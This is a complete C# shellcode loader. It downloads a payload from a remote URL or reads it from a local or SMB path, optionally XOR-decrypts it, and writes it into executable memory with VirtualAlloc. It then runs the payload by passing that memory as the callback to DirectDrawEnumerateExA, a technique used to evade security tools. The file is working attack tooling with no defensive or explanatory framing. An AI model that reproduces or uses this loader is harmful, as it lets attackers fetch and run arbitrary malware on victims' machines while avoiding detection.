using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.Http;

namespace DirectDrawEnumerateExARunner
{
    class Program
    {
        const uint MEM_COMMIT = 0x1000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern void RtlMoveMemory(IntPtr dest, byte[] src, uint size);

        [DllImport("ddraw.dll", SetLastError = true)]
        static extern int DirectDrawEnumerateExA(DDENUMCALLBACKEXA lpCallback, IntPtr context, uint flags);

        delegate bool DDENUMCALLBACKEXA(IntPtr guid, IntPtr driverDescription, IntPtr driverName, IntPtr context, IntPtr hMonitor);

        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("Usage: Program.exe [-r remote_url | local_path_or_SMB_path] [-k xor_key]");
                return;
            }

            string sourcePath = args[1];
            string xorKey = null;

            if (args.Length == 4 && args[2] == "-k")
            {
                xorKey = args[3];
            }

            byte[] shellcode;

            if (args[0] == "-r")
            {
                Console.WriteLine("[Info] Attempting to download shellcode from the provided URL.");
                shellcode = DownloadShellcodeFromUrl(sourcePath);
            }
            else
            {
                Console.WriteLine("[Info] Attempting to read shellcode from the provided file path.");
                shellcode = File.ReadAllBytes(sourcePath);
            }

            if (!string.IsNullOrEmpty(xorKey))
            {
                Console.WriteLine("[Info] Decrypting shellcode using the provided XOR key.");
                shellcode = DecryptShellcode(shellcode, xorKey);
            }

            if (shellcode == null || shellcode.Length == 0)
            {
                Console.WriteLine("[Failed] Failed to load or decrypt shellcode.");
                return;
            }
            else
            {
                Console.WriteLine("[Success] Shellcode loaded/decrypted successfully.");
            }

            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            if (hAlloc == IntPtr.Zero)
            {
                Console.WriteLine($"[Failed] Memory allocation for shellcode failed. Error Code: {Marshal.GetLastWin32Error()}");
                return;
            }

            RtlMoveMemory(hAlloc, shellcode, (uint)shellcode.Length);

            DDENUMCALLBACKEXA del = (DDENUMCALLBACKEXA)Marshal.GetDelegateForFunctionPointer(hAlloc, typeof(DDENUMCALLBACKEXA));
            DirectDrawEnumerateExA(del, IntPtr.Zero, 0);
        }

        static byte[] DownloadShellcodeFromUrl(string url)
        {
            using (var httpClient = new HttpClient())
            {
                try
                {
                    var byteArray = httpClient.GetByteArrayAsync(url).Result;
                    if (byteArray != null && byteArray.Length > 0)
                    {
                        Console.WriteLine("[Success] Shellcode downloaded successfully.");
                        return byteArray;
                    }
                    else
                    {
                        Console.WriteLine("[Failed] Shellcode downloaded but the content is empty or null.");
                        return null;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[Failed] Downloading shellcode: {ex.Message}");
                    return null;
                }
            }
        }

        static byte[] DecryptShellcode(byte[] encryptedShellcode, string xorKey)
        {
            byte[] decryptedShellcode = new byte[encryptedShellcode.Length];
            for (int i = 0; i < encryptedShellcode.Length; i++)
            {
                decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey[i % xorKey.Length]);
            }
            return decryptedShellcode;
        }
    }
}
